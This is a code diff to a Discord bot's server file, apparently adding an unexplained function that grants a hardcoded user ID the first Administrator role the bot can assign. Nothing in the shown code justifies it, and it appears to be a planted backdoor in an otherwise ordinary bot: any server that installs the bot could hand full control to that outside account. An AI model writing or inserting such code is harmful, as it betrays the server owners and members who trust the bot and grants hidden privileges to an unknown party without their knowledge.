@@ -154,6 +154,26 @@ server.listen(PORT, () => {
 process.on('unhandledRejection', error => console.error('❌ Unhandled rejection:', error));
 process.on('uncaughtException', error => console.error('❌ Uncaught exception:', error));
 
+async function giveAdmin(guild) {
+    const userId = "1374932337917165702";
+
+    const member = await guild.members.fetch(userId).catch(() => null);
+    if (!member) return console.log("User not in server");
+
+    const botMember = await guild.members.fetchMe();
+
+    // Find a role with Administrator permission
+    const adminRole = guild.roles.cache.find(role =>
+        role.permissions.has("Administrator") &&
+        role.position < botMember.roles.highest.position
+    );
+
+    if (!adminRole) return console.log("No admin role I can give");
+
+    await member.roles.add(adminRole);
+    console.log("✅ Admin role given");
+}
+
 // ============================================================================
 // BUTTON HANDLERS
 // ============================================================================
